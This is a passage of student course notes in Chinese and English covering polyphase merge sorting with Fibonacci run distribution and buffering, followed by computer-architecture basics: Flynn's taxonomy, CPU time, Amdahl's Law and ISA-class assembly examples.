<p>另一种选择是把原始的 <span class="arithmatex">\(34\)</span>个顺串不均衡地分成两份。设我们把<span class="arithmatex">\(21\)</span>个顺串放到<span class="arithmatex">\(T_2\)</span>上，而把<span class="arithmatex">\(13\)</span>个顺串放到<span class="arithmatex">\(T_3\)</span>上。然后，在<span class="arithmatex">\(T_3\)</span>用完之前将<span class="arithmatex">\(13\)</span>个顺串合并到<span class="arithmatex">\(T_1\)</span>上。然后我们可以将具有<span class="arithmatex">\(13\)</span>个顺串的<span class="arithmatex">\(T_1\)</span>和<span class="arithmatex">\(8\)</span>个顺串的<span class="arithmatex">\(T_2\)</span>合并到<span class="arithmatex">\(T_3\)</span>上。此时，我们合并<span class="arithmatex">\(8\)</span>个顺串直到<span class="arithmatex">\(T_2\)</span>用完为止，这样，在<span class="arithmatex">\(T_1\)</span>上将留下<span class="arithmatex">\(5\)</span>个顺串，而在<span class="arithmatex">\(T_3\)</span>上则有<span class="arithmatex">\(8\)</span>个顺串。然后，我们再合并<span class="arithmatex">\(T_1\)</span>和<span class="arithmatex">\(T_3\)</span>，等等，直到合并结束。</p>
<details class="eg">
<summary>详细过程</summary>
<p><figure markdown="span">
  <img alt="Image title" src="../NOTE/ADS/mul3.png" width="80%" />
  <figcaption>2</figcaption>
  <img alt="Image title" src="../NOTE/ADS/mul4.png" width="80%" />
  <figcaption>3</figcaption>
  <img alt="Image title" src="../NOTE/ADS/mul5.png" width="80%" />
  <figcaption>4</figcaption>
  <img alt="Image title" src="../NOTE/ADS/mul6.png" width="80%" />
  <figcaption>5</figcaption>
  <img alt="Image title" src="../NOTE/ADS/mul7.png" width="80%" />
  <figcaption>6</figcaption>
</figure></p>
<p>最后使用了<span class="arithmatex">\(1+7=8\)</span>个pass。</p>
</details>
<p>事实上，我们给出的最初 21 + 13 的分配是最优的，否则都可能出现上面的需要复制或者有长短不对齐导致浪费的情况。如果顺串的个数是一个斐波那契数 <span class="arithmatex">\( F_n \)</span>，那么分配这些顺串最好的方式是把它们分裂成两个斐波那契数 <span class="arithmatex">\( F_{n-1} \)</span> 和 <span class="arithmatex">\( F_{n-2} \)</span>。否则，为了将顺串的个数补足成一个斐波那契数就必须用一些哑顺串（dummy run）来填补磁带。</p>
<p>将上述算法应用到k-way merge，则需要k阶斐波那契数。</p>
<p>定义为</p>
<div class="arithmatex">\[
F^{(k)}(n) = F^{(k)}(n-1) + F^{(k)}(n-2) + \cdots + F^{(k)}(n-k)
\]</div>
<p>且</p>
<div class="arithmatex">\[
F^{(k)}(0) = F^{(k)}(1) = \cdots = F^{(k)}(k-2) = 0, F^{(k)}(k-1) = 1
\]</div>
<p>经过第一个pass之后,k+1个tape的结构如下</p>
<div class="arithmatex">\[
\begin{align*}
tape1: &amp; \quad F^{(k)}(n-1) + F^{(k)}(n-2) + \cdots + F^{(k)}(n-k+1) + F^{(k)}(n-k) \\
tape2: &amp; \quad F^{(k)}(n-1) + F^{(k)}(n-2) + \cdots + F^{(k)}(n-k+1) \\
&amp; \quad \vdots \\
tapek: &amp; \quad F^{(k)}(n-1) \\
tapek+1: &amp; \quad 0
\end{align*}
\]</div>
<p>然后合并1-k个tape，结果放在tapek+1上，结果如下</p>
<div class="arithmatex">\[
\begin{align*}
tape1: &amp; \quad F^{(k)}(n-2) + F^{(k)}(n-3) + \cdots + F^{(k)}(n-k) \\
tape2: &amp; \quad F^{(k)}(n-2) + F^{(k)}(n-3) + \cdots + F^{(k)}(n-k+1) \\
&amp; \quad \vdots \\
tape k: &amp; \quad 0 \\
tape k+1: &amp; \quad F^{(k)}(n-1) = F^{(k)}(n-2) + F^{(k)}(n-3) + \cdots + F^{(k)}(n-k-1)
\end{align*}
\]</div>
<p>此时我们的顺串个数分布与之前的是类似的，只是下标减了 1，因此我们可以继续合并除磁带 k 外每个磁带的前 <span class="arithmatex">\( F^{(k)}(n-2) \)</span> 个顺串，将合并后的结果放到磁带 k 上，以此类推，直到顺串个数为 1，此时我们就完成了排序。</p>
<h2 id="note-ads-wk14-copy-from-wyys-handout">缓存并行处理(copy from wyy's Handout)<a class="headerlink" href="#note-ads-wk14-copy-from-wyys-handout" title="Permanent link">&para;</a></h2>
<p>在实现外部排序时，我们通常会分块读取数据，而不是每次比较后立即将一个元素写入磁盘。这样做会导致每次比较后都需要等待磁盘处理，耗费大量时间。在2路合并中，内存应划分为2个输入缓存区和1个输出缓存区。输入缓存区用于存放从磁盘读取的数据，两个输入缓存区的数据比较后，结果暂存于输出缓存区。当输出缓存区满时，再一次性写入磁盘。</p>
<p>然而，这种实现仍有问题：当输出缓存区写回磁盘时，内存中的操作会暂停。为解决此问题，我们将输出缓存区拆分为两个。当一个缓存区满并写回磁盘时，另一个缓存区继续接收数据，实现并行处理——一个在内存中操作，另一个进行I/O交互。</p>
<p>输入缓存区也类似。如果只有2个输入缓存区，当数据比较完时，我们必须等待新数据从磁盘读入。因此，我们将其进一步划分为4个输入缓存区。当两个缓存区的数据正在比较时，另外两个缓存区可以并行读取新数据。</p>
<p>这也解释了为什么在k路合并中，尽管趟数减少，但k过高并不一定更优。根据前述讨论，内存应划分为<span class="arithmatex">\(2k\)</span>个输入缓存区和<span class="arithmatex">\(2\)</span>个输出缓存区。当k很大时，输入缓存区被划分得很细，单次读取的数据量减少（即块大小降低），导致I/O操作增多。因此，尽管趟数减少降低了I/O成本，但并不一定更优。最优的k值与具体的硬件配置有关。</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>划分为<span class="arithmatex">\(2k\)</span>个输入缓存区和<span class="arithmatex">\(2\)</span>个输出缓存区是因为需要<span class="arithmatex">\(k+1\)</span>个tapes, <span class="arithmatex">\(k\)</span> 个输入, <span class="arithmatex">\(1\)</span>个输出, 然后为了一直工作,需要double buffer;</p>
</div>
<h2 id="note-ads-wk14-replacement-selection">替换选择(replacement selection)<a class="headerlink" href="#note-ads-wk14-replacement-selection" title="Permanent link">&para;</a></h2></section></section>
                    <section class='print-page md-section' id='section-2-2-4' heading-number='2.2.4'>
                        <h1>计算机体系结构<a class='headerlink' href='#section-2-2-4' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-arch" heading-number="2.2.4.1"><h1 id="note-arch-_1">计算机体系结构<a class="headerlink" href="#note-arch-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 23 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<blockquote>
<p>教师: <a href="https://person.zju.edu.cn/changrui">常瑞</a></p>
</blockquote>
<ul class="task-list">
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-arch-chap1">Fundamentals of computer design</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> <a href="#note-arch-chap2">Pipeling</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> <a href="#note-arch-chap3">Memory Hierarchy</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> <a href="#note-arch-chap4">ILP</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> <a href="#note-arch-chap5">DLP and TLP</a></li>
</ul></section><section class="print-page" id="note-arch-chap1" heading-number="2.2.4.2"><h1 id="note-arch-chap1-fundamentals-of-computer-design">Fundamentals of computer design<a class="headerlink" href="#note-arch-chap1-fundamentals-of-computer-design" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1193 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 37 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 5 分钟</p>
</div>
<h2 id="note-arch-chap1-introduction">Introduction<a class="headerlink" href="#note-arch-chap1-introduction" title="Permanent link">&para;</a></h2>
<h3 id="note-arch-chap1-classer-of-computers">Classer of computers<a class="headerlink" href="#note-arch-chap1-classer-of-computers" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>Desktop computers (or personal computers .aka. PC)</p>
<ul>
<li>General-purpose,vatiety of software</li>
<li>Emphasize good performance for a single user at relatively low cost</li>
<li>Mostly execute third-party software(第三方软件)</li>
</ul>
</li>
<li>
<p>Server Computers</p>
<ul>
<li>Emphasize great performance for a few complex applications</li>
<li>Or emphasize reliable performance for many users at once</li>
<li>Greater computing power, storage, or network capacity than personal computers</li>
</ul>
</li>
<li>
<p>Embedded computers</p>
<ul>
<li>Largest class and most diverse</li>
<li>Hidden as components of systems</li>
<li>Stringent power, cost, and size constraints,performance.</li>
</ul>
</li>
<li>
<p>Personal Mobile Devices</p>
<ul>
<li>Such as smartphones, tablets/ipad, and wearables</li>
<li>generally have the same design requirements as PCs</li>
</ul>
</li>
<li>
<p>Supercomputer</p>
<ul>
<li>Computer cluster(集群)</li>
<li>High capacity,prformance, and reliability</li>
<li>Range to building size(即大型机)</li>
</ul>
</li>
</ul>
<h4 id="note-arch-chap1-class-by-flynn">Class By Flynn<a class="headerlink" href="#note-arch-chap1-class-by-flynn" title="Permanent link">&para;</a></h4>
<p>福林分类法</p>
<ul>
<li>SISD: Single Instruction Stream, Single Data Stream</li>
<li>SIMD: Single Instruction Stream, Multiple Data Stream</li>
<li>MISD: Multiple Instruction Stream, Single Data Stream</li>
<li>MIMD: Multiple Instruction Stream, Multiple Data Stream</li>
</ul>
<div class="admonition info">
<p class="admonition-title">definition</p>
<ul>
<li>IS: Instruction Stream</li>
<li>DS: Data Stream</li>
<li>CS: Control Stream</li>
<li>CU: Control Unit</li>
<li>PU: Processing Unit</li>
<li>MM&amp;SM: Memory Module &amp; Storage Module</li>
</ul>
</div>
<p>See as follows:</p>
<div align="center">
    <img src="../NOTE/Arch/img/lec1-1.png" width="70%">
</div>

<h2 id="note-arch-chap1-performance">Performance<a class="headerlink" href="#note-arch-chap1-performance" title="Permanent link">&para;</a></h2>
<p>There are a lot of factors that can affect the performance:</p>
<ul>
<li>Architecture</li>
<li>Hardware implementation</li>
<li>Compiler</li>
<li>Operating system</li>
<li>Application</li>
</ul>
<p>Two major performance metrics:</p>
<ul>
<li>Latency: The time it takes to complete a task(Response time)</li>
<li>Throughput: The rate at which a task can be completed (Bandwidth)</li>
</ul>
<p>We define the performance as:</p>
<div class="arithmatex">\[
    Performance = \frac{1}{Execution}
\]</div>
<p>性能与执行时间成反比</p>
<h2 id="note-arch-chap1-quantitative-approaches">Quantitative approaches<a class="headerlink" href="#note-arch-chap1-quantitative-approaches" title="Permanent link">&para;</a></h2>
<ul>
<li>Bit</li>
<li>Nibble: 4 bits</li>
<li>Byte: 8 bits</li>
<li>Word: 32 bits on many embedded systems</li>
<li>Word: 64 bits on most desktop and server systems</li>
<li>Kibibyte: <span class="arithmatex">\(2^{10}\)</span> bytes,KB</li>
<li>Mebibyte: <span class="arithmatex">\(2^{20}\)</span> bytes,MB</li>
<li>Gibibyte: <span class="arithmatex">\(2^{30}\)</span> bytes,GB</li>
<li>Tebibyte: <span class="arithmatex">\(2^{40}\)</span> bytes,TB</li>
</ul>
<h3 id="note-arch-chap1-cpu-performance">CPU Performance<a class="headerlink" href="#note-arch-chap1-cpu-performance" title="Permanent link">&para;</a></h3>
<div class="arithmatex">\[
      CPU \ Execution \ Time = \frac{CPU \ Cycles}{Clock \ Rate} = CPU \ Cycles \times Clock \ Period
\]</div>
<div class="admonition eg">
<p class="admonition-title">CPU time example</p>
<ul>
<li><strong>Computer A</strong>: 2GHz clock, 10s CPU time</li>
<li><strong>Designing Computer B</strong></li>
<li>Aim for 6s CPU time</li>
<li>Can do faster clock, but causes 1.2 × clock cycles</li>
</ul>
<p>To determine how fast Computer B's clock must be:</p>
<div class="arithmatex">\[
\text{Clock Rate}_B = \frac{\text{Clock Cycles}_B}{\text{CPU Time}_B} = \frac{1.2 \times \text{Clock Cycles}_A}{6s}
\]</div>
<p>Calculate Clock Cycles for Computer A:</p>
<div class="arithmatex">\[
\text{Clock Cycles}_A = \text{CPU Time}_A \times \text{Clock Rate}_A = 10s \times 2GHz = 20 \times 10^9
\]</div>
<p>Calculate Clock Rate for Computer B:</p>
<div class="arithmatex">\[
\text{Clock Rate}_B = \frac{1.2 \times 20 \times 10^9}{6s} = \frac{24 \times 10^9}{6s} = 4GHz
\]</div>
</div>
<p>CPI: Cycles Per Instruction is the average number of clock cycles per instruction.</p>
<div class="arithmatex">\[
    CPI = \frac{CPU \ Cycles}{Instruction \ Count}
\]</div>
<p>some CPU time could also be written as:</p>
<div class="arithmatex">\[
    CPU \ Time = \frac{Instruction \ Count \times CPI}{Clock \ Rate}
\]</div>
<p>The Big Picture:</p>
<div class="arithmatex">\[
    CPU \ Time = \frac{Instructions}{Program} \times \frac{Clock \ cycles}{Instruction} \times \frac{Seconds}{Clock \ cycle}
\]</div>
<p>Performance depence on:</p>
<ul>
<li>Algorithm：affects IC,CPI</li>
<li>Programming language: affects IC,CPI</li>
<li>Compiler: affects CPI,IC</li>
<li>Instruction set architecture: affects CPI,IC,T</li>
</ul>
<h3 id="note-arch-chap1-amdahls-law">Amdahl's Law<a class="headerlink" href="#note-arch-chap1-amdahls-law" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Amdahl's Law</p>
<p>Amdahl's Law states that the performance improvement to be gained from using some faster mode of execution is limited by the fraction of the time the faster mode can be used.</p>
<p>Amdahl's Law depends on two factors:</p>
<ul>
<li>The fraction of the time the enhancement can be exploited.</li>
<li>The improvement gained by the enhancement while it is exploited.</li>
</ul>
<div class="arithmatex">\[
\text{Improved Execution Time} = \frac{\text{Affected Execution Time}}{\text{Amount of Improvement}} + \text{Unaffected Execution Time}
\]</div>
<p>即部分改进的执行时间除以改进的倍数，加上未改进的执行时间，等于改进后的执行时间。</p>
</div>
<p>So based on Amdahl's Law, we can get the following formula:</p>
<div class="arithmatex">\[
\text{Execution time}_{\text{new}} = \text{Execution time}_{\text{old}} \times \left( (1 - \text{Fraction}_{\text{enhanced}}) + \frac{\text{Fraction}_{\text{enhanced}}}{\text{Speedup}_{\text{enhanced}}} \right)
\]</div>
<div class="arithmatex">\[
\text{Speedup}_{\text{overall}} = \frac{\text{Execution time}_{\text{old}}}{\text{Execution time}_{\text{new}}} = \frac{1}{(1 - \text{Fraction}_{\text{enhanced}}) + \frac{\text{Fraction}_{\text{enhanced}}}{\text{Speedup}_{\text{enhanced}}}}
\]</div>
<p>from the formula above, we can conclude that:</p>
<ul>
<li>The overall speedup is limited by the enhancement that is used the least.</li>
<li>If Fraction is close to 1, the overall speedup is close to the speedup of the enhancement.</li>
<li>If speedup of the enhancement is close to infinity, the overall speedup is close to 1/(1-Fraction).Which ,in fact ,is hard to achieve.</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Amdahl's Law Example</p>
<ul>
<li><strong>Original Execution Time</strong>: 10 seconds</li>
<li><strong>Enhancement</strong>: 2x speedup</li>
<li><strong>Fraction of Execution Time Affected</strong>: 0.5
The execution time after enhancement is:</li>
</ul>
<div class="arithmatex">\[
\text{Execution time}_{\text{new}} = 10 \times \left( (1 - 0.5) + \frac{0.5}{2} \right) = 10 \times 0.75 = 7.5 \text{ seconds}
\]</div>
<p>The overall speedup is:</p>
<div class="arithmatex">\[
\text{Speedup}_{\text{overall}} = \frac{10}{7.5} = 1.33
\]</div>
</div>
<h2 id="note-arch-chap1-great-architecture-ideas">Great Architecture ideas<a class="headerlink" href="#note-arch-chap1-great-architecture-ideas" title="Permanent link">&para;</a></h2>
<h3 id="note-arch-chap1-moores-law">Moore's Law<a class="headerlink" href="#note-arch-chap1-moores-law" title="Permanent link">&para;</a></h3>
<p>Moore's Law is a principle that states that the number of transistors on a microchip doubles approximately every two years.</p>
<h3 id="note-arch-chap1-use-abstraction-to-simplify-design">Use abstraction to simplify design<a class="headerlink" href="#note-arch-chap1-use-abstraction-to-simplify-design" title="Permanent link">&para;</a></h3>
<p>Abstraction is a technique that allows us to simplify a complex system by hiding unnecessary details.Low-level details are hidden from the higher-level components.</p>
<h3 id="note-arch-chap1-make-the-common-case-fast">Make the common case fast<a class="headerlink" href="#note-arch-chap1-make-the-common-case-fast" title="Permanent link">&para;</a></h3>
<ul>
<li>Identify the common case and try to improve it.</li>
<li>Most cost-efficient method to obtain improvements.</li>
</ul>
<h3 id="note-arch-chap1-improve-performance-via-parallelism">Improve performance via parallelism<a class="headerlink" href="#note-arch-chap1-improve-performance-via-parallelism" title="Permanent link">&para;</a></h3>
<ul>
<li>Improve performance by performing operations in parallel.</li>
<li>There are many levels of parallelism—instruction-level, process-level, etc.</li>
</ul>
<h3 id="note-arch-chap1-improve-performance-via-pipelining">Improve performance via pipelining<a class="headerlink" href="#note-arch-chap1-improve-performance-via-pipelining" title="Permanent link">&para;</a></h3>
<ul>
<li>Break tasks into stages so that multiple tasks can be simultaneously performed in different stages.</li>
<li>Commonly used to improve instruction throughput.</li>
</ul>
<h3 id="note-arch-chap1-improve-performance-via-prediction">Improve performance via prediction<a class="headerlink" href="#note-arch-chap1-improve-performance-via-prediction" title="Permanent link">&para;</a></h3>
<ul>
<li>Sometimes faster to assume a particular result than waiting until the result is known.</li>
<li>Known as speculation and is used to guess results of branches.</li>
</ul>
<h3 id="note-arch-chap1-use-a-hierarchy-of-memories">Use a hierarchy of memories<a class="headerlink" href="#note-arch-chap1-use-a-hierarchy-of-memories" title="Permanent link">&para;</a></h3>
<ul>
<li>Make the fastest, smallest, and most expensive per bit memory the first level accessed and the slowest, largest, and cheapest per bit memory the last level accessed.</li>
<li>Allows most accesses to be caught at the first level and be able to retain most of the information at the lowest level.</li>
</ul>
<h3 id="note-arch-chap1-improve-dependability-via-redundancy">Improve dependability via redundancy<a class="headerlink" href="#note-arch-chap1-improve-dependability-via-redundancy" title="Permanent link">&para;</a></h3>
<ul>
<li>Include redundant components that can both detect and correct failures.</li>
<li>Used at many different levels.</li>
</ul>
<h2 id="note-arch-chap1-instruction-set-architecture">Instruction Set Architecture<a class="headerlink" href="#note-arch-chap1-instruction-set-architecture" title="Permanent link">&para;</a></h2>
<p>instruction set architecture(ISA) is the set of instructions that a processor can execute.</p>
<p>when designing an ISA, we need to consider the following basic principles:</p>
<ul>
<li>
<p>Compatibility:</p>
<ul>
<li>The ISA should be compatible with the existing software.</li>
</ul>
</li>
<li>
<p>Versatility:</p>
<ul>
<li>The ISA should be versatile enough to support a variety of applications.</li>
</ul>
</li>
<li>
<p>High efficiency:</p>
<ul>
<li>The ISA should be efficient in terms of the number of instructions and the amount of data that can be processed in a single instruction.</li>
</ul>
</li>
<li>
<p>Security:</p>
<ul>
<li>The ISA should be secure enough to prevent attacks.</li>
</ul>
</li>
</ul>
<h3 id="note-arch-chap1-instruction-set-design-issues">Instruction Set design issues<a class="headerlink" href="#note-arch-chap1-instruction-set-design-issues" title="Permanent link">&para;</a></h3>
<ul>
<li>Where are operands stored?: registers,memory,stack,accumulator,etc.</li>
<li>How many operands are needed?: 0,1,2,3,etc. <span style="color:red">Classification of instructions</span></li>
<li>How is the operand location specified?: immediate,direct,indirect,relative,etc. <span style="color:red">Addressing modes</span></li>
<li>What type and  size of operands are needed?: integer,floating-point,vector,etc. <span style="color:red">Data representation</span></li>
<li>What operations are supported?: arithmetic,logic,control,etc. <span style="color:red">Types of instructions</span></li>
</ul>
<p><strong>ISA Classes</strong></p>
<ul>
<li>Stack architecture</li>
<li>Accumulator architecture</li>
<li>Register architecture</li>
<li>General-purpose registers architecture(GPR)</li>
</ul>
<p>对于<code>A*B-(A+C*B)</code></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-arch-chap1-__codelineno-0-1"></a>; Stack architecture
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-arch-chap1-__codelineno-0-2"></a>PUSH A
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-arch-chap1-__codelineno-0-3"></a>PUSH B
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-arch-chap1-__codelineno-0-4"></a>MUL         ; A * B
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-arch-chap1-__codelineno-0-5"></a>PUSH A
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-arch-chap1-__codelineno-0-6"></a>PUSH C
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-arch-chap1-__codelineno-0-7"></a>PUSH B
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-arch-chap1-__codelineno-0-8"></a>MUL         ; C * B
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-arch-chap1-__codelineno-0-9"></a>ADD         ; A + (C * B)
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-arch-chap1-__codelineno-0-10"></a>SUB         ; (A * B) - (A + C * B)
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-arch-chap1-__codelineno-1-1"></a>; Accumulator architecture
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-arch-chap1-__codelineno-1-2"></a>LOAD A      ; Acc = A
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-arch-chap1-__codelineno-1-3"></a>MUL B       ; Acc = A * B
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-arch-chap1-__codelineno-1-4"></a>STORE TEMP  ; Store result in TEMP
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-arch-chap1-__codelineno-1-5"></a>LOAD B      ; Acc = B
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-arch-chap1-__codelineno-1-6"></a>MUL C       ; Acc = C * B
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-arch-chap1-__codelineno-1-7"></a>ADD A       ; Acc = A + (C * B)
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-arch-chap1-__codelineno-1-8"></a>STORE TEMP2 ; Store result in TEMP2
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-arch-chap1-__codelineno-1-9"></a>LOAD TEMP    ; Acc = (A * B)
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#note-arch-chap1-__codelineno-1-10"></a>SUB TEMP2   ; Acc = (A * B) - (A + C * B)
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-arch-chap1-__codelineno-2-1"></a>; Register architecture
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-arch-chap1-__codelineno-2-2"></a>LOAD R1, A  ; R1 = A
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-arch-chap1-__codelineno-2-3"></a>LOAD R2, B  ; R2 = B
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-arch-chap1-__codelineno-2-4"></a>MUL R3, R1, R2  ; R3 = A * B
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-arch-chap1-__codelineno-2-5"></a>LOAD R4, C  ; R4 = C
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-arch-chap1-__codelineno-2-6"></a>MUL R4, R4, R2  ; R4 = C * B
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-arch-chap1-__codelineno-2-7"></a>ADD R4, R4, R1  ; R4 = A + C * B
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#note-arch-chap1-__codelineno-2-8"></a>SUB R3, R3, R4  ; R3 = (A * B) - (A + C * B)
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-arch-chap1-__codelineno-3-1"></a>; General-purpose registers architecture(GPR)
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-arch-chap1-__codelineno-3-2"></a>load R1, A
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-arch-chap1-__codelineno-3-3"></a>load R2, B
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-arch-chap1-__codelineno-3-4"></a>mul R3, R1, R2  ; R3 = A * B
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#note-arch-chap1-__codelineno-3-5"></a>load R4, C
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#note-arch-chap1-__codelineno-3-6"></a>load R5, B
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#note-arch-chap1-__codelineno-3-7"></a>mul R6, R4, R5  ; R6 = C * B
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#note-arch-chap1-__codelineno-3-8"></a>add R6, R6, R1  ; R6 = A + C * B
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#note-arch-chap1-__codelineno-3-9"></a>sub R3, R3, R6  ; R3 = (A * B) - (A + C * B)
</span></code></pre></div></section><section class="print-page" id="note-arch-chap4" heading-number="2.2.4.3"><h1 id="note-arch-chap4-instruction-level-parallelism">Instruction-Level Parallelism<a class="headerlink" href="#note-arch-chap4-instruction-level-parallelism" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
